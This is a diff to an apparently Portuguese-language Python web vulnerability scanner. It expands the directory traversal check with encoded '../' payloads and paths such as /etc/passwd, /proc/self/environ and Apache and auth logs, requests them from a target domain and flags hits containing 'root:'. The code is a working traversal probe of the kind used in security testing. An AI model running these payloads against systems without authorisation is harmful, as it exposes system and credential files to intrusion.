@@ -135,21 +135,37 @@ def scan_sensitive_data(domain):
 
 def scan_traversal(domain):
     print(f"Scanning {domain} for directory traversal vulnerabilities...")
-    payloads = ["../", "..%2f", "..%252f", "..%c0%af", "..\\", "..\\\\", "%2e%2e%2f", "%2e%2e/", "%252e%252e%255c"]
+    
+    # Lista de payloads ampliada para detecção de Directory Traversal
+    payloads = [
+        "../", "..%2f", "..%252f", "..%c0%af", "..\\", "..\\\\", "%2e%2e%2f", "%2e%2e/", "%252e%252e%255c",
+        "..%5c", "..%5c%5c", "....//", "....//..", "/etc/passwd", "/proc/self/environ", "/var/log/auth.log", 
+        "/var/log/apache2/access.log", "/var/log/apache2/error.log", "/var/log/syslog", "/boot/grub/grub.cfg"
+    ]
+    
+    # Lista de diretórios e arquivos para testar
+    test_files = [
+        "etc/passwd", "etc/hosts", "var/log/auth.log", "var/log/apache2/access.log", 
+        "var/log/apache2/error.log", "proc/self/environ", "boot/grub/grub.cfg"
+    ]
+    
     report = []
     vulnerable = False
 
+    # Testar cada payload nos arquivos
     for payload in payloads:
-        url = f"http://{domain}/{payload}etc/passwd"
-        try:
-            r = requests.get(url, timeout=5)
-            if "root:" in r.text:
-                print(colored(f"[!] Possível Directory Traversal detectado: {url}", "red"))
-                report.append(f"[ALTA] {url} — Contém padrão 'root:'")
-                vulnerable = True
-        except Exception as e:
-            continue
+        for test_file in test_files:
+            url = f"http://{domain}/{payload}{test_file}"
+            try:
+                r = requests.get(url, timeout=5)
+                if r.status_code == 200 and "root:" in r.text:
+                    print(colored(f"[!] Possível Directory Traversal detectado: {url}", "red"))
+                    report.append(f"[ALTA] {url} — Contém padrão 'root:'")
+                    vulnerable = True
+            except requests.exceptions.RequestException as e:
+                continue
 
+    # Se alguma vulnerabilidade for encontrada
     if vulnerable:
         salvar_relatorio(domain, report, "directory_traversal")
     else:
